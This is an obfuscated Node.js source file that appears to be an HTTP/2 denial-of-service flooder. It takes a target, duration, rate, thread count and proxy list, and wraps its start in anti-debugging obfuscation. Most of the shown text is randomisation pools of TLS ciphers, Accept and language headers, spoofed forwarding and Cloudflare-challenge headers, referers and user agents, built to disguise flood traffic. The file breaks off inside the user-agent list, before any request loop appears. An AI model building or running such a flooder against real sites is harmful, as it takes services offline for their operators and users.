function KONTOLLLLL_0x53d447() {
  const _0x5c0553 = (function () {
    let _0xb70b33 = true
    return function (_0x1f42e3, _0x2f7036) {
      const _0x8909b2 = _0xb70b33
        ? function () {
            if (_0x2f7036) {
              const _0x170dd3 = _0x2f7036.apply(_0x1f42e3, arguments)
              return (_0x2f7036 = null), _0x170dd3
            }
          }
        : function () {}
      return (_0xb70b33 = false), _0x8909b2
    }
  })()
  const _0x2ca6cf = _0x5c0553(this, function () {
    return _0x2ca6cf
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x2ca6cf)
      .search('(((.+)+)+)+$')
  })
  _0x2ca6cf()
  const _0x36f3f4 = (function () {
    let _0x274bb9 = true
    return function (_0x50a8f5, _0x1254cd) {
      const _0x387b0f = _0x274bb9
        ? function () {
            if (_0x1254cd) {
              const _0x7fb280 = _0x1254cd.apply(_0x50a8f5, arguments)
              return (_0x1254cd = null), _0x7fb280
            }
          }
        : function () {}
      return (_0x274bb9 = false), _0x387b0f
    }
  })()
  ;(function () {
    _0x36f3f4(this, function () {
      const _0x12562a = new RegExp('function *\\( *\\)'),
        _0xe8927f = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
        _0x2fa742 = KONTOLLLLL_0x36ff6b('init')
      if (
        !_0x12562a.test(_0x2fa742 + 'chain') ||
        !_0xe8927f.test(_0x2fa742 + 'input')
      ) {
        _0x2fa742('0')
      } else {
        KONTOLLLLL_0x36ff6b()
      }
    })()
  })()
  console.log('Coba Decrypt Puh!')
}
KONTOLLLLL_0x53d447()
const KONTOLLLLL_0x44b201 = require('net'),
  KONTOLLLLL_0x6f5cbf = require('http2'),
  KONTOLLLLL_0x4a55a0 = require('tls'),
  KONTOLLLLL_0x4b0407 = require('cluster'),
  KONTOLLLLL_0x5a87fc = require('url'),
  KONTOLLLLL_0x2e5e77 = require('crypto'),
  KONTOLLLLL_0x278f4e = require('fake-useragent'),
  KONTOLLLLL_0x4b1015 = require('fs')
process.setMaxListeners(0)
require('events').EventEmitter.defaultMaxListeners = 0
process.on('uncaughtException', function (_0x2b6655) {})
process.argv.length < 7 &&
  (console.log('Usage: node target time rate thread proxyfile'), process.exit())
const KONTOLLLLL_0x2a5fb1 = {}
function KONTOLLLLL_0x39047a(_0x58d2b4) {
  return KONTOLLLLL_0x4b1015.readFileSync(_0x58d2b4, 'utf-8')
    .toString()
    .split(/\r?\n/)
}
function KONTOLLLLL_0x4c7ac9(_0x3b8803, _0x362113) {
  return Math.floor(Math.random() * (_0x362113 - _0x3b8803) + _0x3b8803)
}
function KONTOLLLLL_0x4712e5(_0x3b962d) {
  return _0x3b962d[KONTOLLLLL_0x4c7ac9(0, _0x3b962d.length)]
}
function KONTOLLLLL_0x84afee(_0x5055a7) {
  let _0x170486 = ''
  const _0x2bf89a =
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.length
  for (let _0x3f8aba = 0; _0x3f8aba < _0x5055a7; _0x3f8aba++) {
    _0x170486 +=
      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.charAt(
        Math.floor(Math.random() * _0x2bf89a)
      )
  }
  return _0x170486
}
const KONTOLLLLL_0x3f806e = () => {
    const _0x36b6b6 = () => {
      return Math.floor(Math.random() * 255)
    }
    return (
      _0x36b6b6() + '.' + _0x36b6b6() + '.' + _0x36b6b6() + '.' + _0x36b6b6()
    )
  },
  KONTOLLLLL_0x2cde7d = KONTOLLLLL_0x3f806e(),
  KONTOLLLLL_0x47cd91 = () => {
    const _0x31ba5b = () => {
      return Math.floor(Math.random() * 9999)
    }
    return '' + _0x31ba5b()
  },
  KONTOLLLLL_0x24b8cc = KONTOLLLLL_0x47cd91(),
  KONTOLLLLL_0x2cb951 = () => {
    const _0x12d8bf = () => {
      return Math.floor(Math.random() * 50000)
    }
    return '' + _0x12d8bf()
  },
  KONTOLLLLL_0x361531 = KONTOLLLLL_0x2cb951(),
  KONTOLLLLL_0x31ae25 = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
  },
  KONTOLLLLL_0x315dc2 = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
  ],
  KONTOLLLLL_0x161784 = KONTOLLLLL_0x315dc2.join(':')
const KONTOLLLLL_0xc792b2 = [
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-RSA-CHACHA20-POLY1305',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  ],
  KONTOLLLLL_0x47031e = [
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
    'text/html; charset=utf-8',
    'application/json, text/plain, */*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0',
    'Connection: keep-alive',
    'Referer: https://www.example.com',
    'Upgrade-Insecure-Requests: 1',
    'DNT: 1',
    'Accept-Encoding: gzip, deflate, br',
    'Cache-Control: max-age=0',
    'Host: www.example.com',
    'Origin: https://www.example.com',
    'Content-Type: application/x-www-form-urlencoded',
    'Content-Length: 42',
    'Cookie: session_id=abc123; user_id=12345',
    'If-None-Match: "686897696a7c876b7e"',
    'X-Requested-With: XMLHttpRequest',
    'X-Forwarded-For: 192.168.1.1',
    'CF-Challenge: captcha-challenge-header',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel',
  ]
lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  ' en-GB,en;q=0.7',
]
const KONTOLLLLL_0x104a8f = [
    'gzip, deflate, br',
    'deflate',
    'gzip, deflate, lzma, sdch',
    'deflate',
  ],
  KONTOLLLLL_0x4beb5a = ['no-cache', 'max-age=0'],
  KONTOLLLLL_0xced031 = [
    'https://www.google.com/',
    'https://www.facebook.com/',
    'https://www.twitter.com/',
    'https://www.youtube.com/',
    'https://www.linkedin.com/',
    'https://proxyscrape.com/',
    'https://www.instagram.com/',
    'https://wwww.reddit.com/',
    'https://fivem.net/',
    'https://www.fbi.gov/',
    'https://nettruyenplus.com/',
    'https://vnexpress.net/',
    'https://zalo.me',
    'https://shopee.vn',
    'https://www.tiktok.com/',
    'https://google.com.vn/',
    'https://tuoitre.vn/',
    'https://thanhnien.vn/',
    'https://nettruyento.com/',
  ],
  KONTOLLLLL_0x35ecb6 =
    KONTOLLLLL_0x2e5e77.constants.defaultCoreCipherList.split(':'),
  KONTOLLLLL_0x40563a =
    'GREASE:' +
    [
      KONTOLLLLL_0x35ecb6[2],
      KONTOLLLLL_0x35ecb6[1],
      KONTOLLLLL_0x35ecb6[0],
      ...KONTOLLLLL_0x35ecb6.slice(3),
    ].join(':'),
  KONTOLLLLL_0x5a803c = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
    'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
